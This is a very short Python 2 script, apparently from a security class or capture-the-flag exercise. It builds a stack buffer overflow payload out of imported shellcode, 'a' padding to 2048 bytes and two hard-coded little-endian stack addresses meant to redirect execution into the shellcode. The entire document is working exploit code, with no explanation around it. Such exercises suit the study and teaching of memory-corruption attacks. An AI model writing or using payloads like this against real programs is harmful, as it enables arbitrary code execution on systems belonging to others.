#!/usr/bin/env
from shellcode import shellcode

print shellcode+"a"*(2048-len(shellcode))+"\x58\x7f\xfe\xbf"+"\x6c\x87\xfe\xbf"

